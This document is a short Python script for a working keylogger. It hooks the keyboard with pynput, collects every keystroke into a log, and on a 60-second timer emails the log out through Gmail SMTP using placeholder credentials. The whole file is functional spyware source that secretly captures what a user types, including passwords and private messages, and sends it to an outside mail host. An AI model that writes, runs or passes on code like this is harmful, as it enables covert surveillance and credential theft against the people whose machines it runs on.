#! /usr/bin/env python

import pynput.keyboard as pynkey
import threading
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


class Keylogger:
    def __init__(self, email, password, interval=60):
        self.log = "Keylogger has been started."
        self.email = email
        self.password = password
        self.interval = interval

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # TODO: consider using yagmail, adding topic and better formatting.

    def start(self):
        print("[+] Keylogger has been started.")
        keyboard_listener = pynkey.Listener(on_press=self.process_key_press)
        # Can also run it without 'with' block, using .join() method.
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


if __name__ == "__main__":
    mail = "email@gmail.com"
    pwd = "password"
    keylogger = Keylogger(mail, pwd)
    keylogger.start()
